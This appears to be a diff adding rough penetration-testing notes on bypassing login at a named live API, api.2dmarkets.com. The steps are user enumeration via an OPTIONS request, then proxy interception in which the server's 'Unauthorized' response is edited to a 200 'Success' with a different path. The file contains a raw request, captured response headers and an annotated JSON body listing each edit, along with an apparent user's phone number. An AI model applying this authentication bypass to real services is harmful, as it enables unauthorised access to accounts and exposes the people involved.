@@ -1,0 +1,62 @@
+client ---- Request ---- Server
+            GET/ admin
+
+Server ---- Response(Manipulate) ---- client
+            302 or 404 to --> 200 ok
+
+
+1. User enumeration
+----------------
+
+Find that user is signed in this server
+
+
+OPTIONS /market/auth/login HTTP/1.1
+Host: api.2dmarkets.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+
+
+2. Option method is not important, it is giving a choice between GET or POST method --> forward
+
+3. ******If there is GET or POST method start to do intercept response from server in proxy mode*******
+
+
+4. ////
+
+HTTP/2 200 ok   ---> change
+
+Date: Sun, 21 Jan 2024 06:51:53 GMT
+Content-Type: application/json
+Vary: Origin,Access-Control-Request-Method,Access-Control-Request-Headers,Origin,Access-Control-Request-Method,Access-Control-Request-Headers,Origin,Access-Control-Request-Method,Access-Control-Request-Headers
+Access-Control-Allow-Origin: *
+X-Content-Type-Options: nosniff
+X-Xss-Protection: 1; mode=block
+Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+Pragma: no-cache
+Expires: 0
+X-Frame-Options: DENY
+X-Envoy-Upstream-Service-Time: 99
+Cf-Cache-Status: DYNAMIC
+Report-To: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v3?s=qWkgZcPteaBRxkTC6oQubrtnPaqVIvYZVqmDmaG6OFIs3VhIUfA%2Bv3KlpZnOOmvvbFaP%2BbpitTN8dbW0M6F%2F6wQrJZ0nkCNkZ2eXdW%2B3mpZPT9d65uzlL%2Ba9KLq9s3BrSxpnuw%3D%3D"}],"group":"cf-nel","max_age":604800}
+Nel: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}
+Server: cloudflare
+Cf-Ray: 848da19858997977-SIN
+Alt-Svc: h3=":443"; ma=86400
+
+{"timestamp":1705819913133,
+"username":"09968168333", ---> add user login phone number
+"status":200,             ---> change status code
+"error":"Unauthorized",   ---> delete error message
+"message":"Error: Unauthorized", ----> change to "Success" or delete it
+"path":"/market/auth/login"      ----> change to "/market/auth/success" or delete it
+}
+
+///
+
+5.If it is ok --> server-side response [200] ---> It will take fronted client side/banner (GET /market/announcement)
+
+
+authorization: JWT
+
+
